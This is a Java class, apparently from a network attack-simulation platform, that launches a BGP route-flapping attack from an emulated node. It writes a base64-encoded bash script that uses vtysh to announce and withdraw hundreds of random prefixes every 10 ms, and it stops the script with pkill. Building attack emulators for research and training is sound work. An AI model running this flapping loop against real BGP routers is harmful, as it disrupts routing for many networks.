package com.routebox.manager.attack.bgp;

import com.routebox.common.constants.ConfConstants;
import com.routebox.entity.index.AttackLog;
import com.routebox.manager.InteractionManager;
import com.routebox.util.IpBgpUtil;
import com.routebox.util.TimeUtil;
import com.routebox.manager.InteractionManager.WsOptions;

import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;

/**
 * @Description Route Flap Attack Handler
 * @Date 2025/3/29
**/
public class RouteFlappingAttackHandler extends BgpAttackHandler {

    private static final String baseScriptContent = """
            #!/bin/bash
            
            exit_flag=0
            trap 'exit_flag=1' SIGTERM SIGINT
            
            while true; do
                if [ $exit_flag -eq 1 ]; then
                    exit 0
                fi
                vtysh -c 'configure' -c 'router bgp' %s
                sleep 0.01
                vtysh -c 'configure' -c 'router bgp' %s
                sleep 0.01
            done
            """;


    public RouteFlappingAttackHandler(Integer attackerId) {
        super(attackerId, null, "Route Flapping");
    }

    @Override
    public boolean attack() {
        List<String> cmdList = new ArrayList<>();
        cmdList.add("mkdir -p " + ConfConstants.containerFilePath());
        String scriptPath = ConfConstants.containerFilePath() + "/routeShock.sh";
        cmdList.add("touch " + scriptPath);
        List<String> ipPrefixes = IpBgpUtil.generateRandomIpPrefixes(256 + random.nextInt(768));

        // Construct Attack Command
        StringBuilder network = new StringBuilder();
        for (String ipPrefix : ipPrefixes) {
            network.append(" -c 'network ").append(ipPrefix).append("'");
        }
        StringBuilder noNetwork = new StringBuilder();
        for (String ipPrefix : ipPrefixes) {
            noNetwork.append(" -c 'no network ").append(ipPrefix).append("'");
        }
        String scriptContent = baseScriptContent.formatted(network, noNetwork);
        // Convert Script Content to Base64 Encoded String
        String encodedScript = Base64.getEncoder().encodeToString(scriptContent.getBytes(StandardCharsets.UTF_8));
        cmdList.add("echo " + encodedScript + " | base64 -d > " + scriptPath);
        cmdList.add("(bash " + scriptPath + " &)");

        InteractionManager.sendCmdList(getAttackerId(), cmdList);

        postAttack(getAttackLog("Node [" +
                getAttackerId() +
                "] launched " +
                ATTACK_TYPE +
                " attack at " +
                TimeUtil.getNowTimeStr()
        ));

        return true;
    }

    private AttackLog getAttackLog(String attackProcess) {
        AttackLog attackLog = new AttackLog();
        attackLog.setAttackers(List.of(getAttackerId()));
        attackLog.setVictims(null);
        attackLog.setAttackProcess(attackProcess);

        return attackLog;
    }

    @Override
    public void restoreState() {
        InteractionManager.sendCmd(getAttackerId(), "pkill -f \"routeShock.sh\"");
    }
}